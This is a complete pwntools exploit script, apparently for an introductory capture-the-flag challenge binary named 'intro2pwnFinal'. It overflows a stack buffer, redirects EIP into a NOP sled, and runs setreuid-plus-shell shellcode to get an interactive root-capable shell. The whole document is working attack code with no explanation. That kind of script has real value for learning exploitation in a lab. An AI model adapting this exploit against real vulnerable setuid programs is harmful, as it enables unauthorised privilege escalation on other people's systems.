from pwn import *

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd440 + 200)
nop = '\x90' * 1000

shellcode = '\xcc'

context.update(arch='i386', os='linux') #x86_64

shellcode = shellcraft.setreuid()
shellcode += shellcraft.sh()
#print(asm(shellcode))

payload = padding + eip + nop + asm(shellcode)
#print(payload)

c = process('./intro2pwnFinal')
c.readuntil('\n')
c.write(payload)

c.interactive()
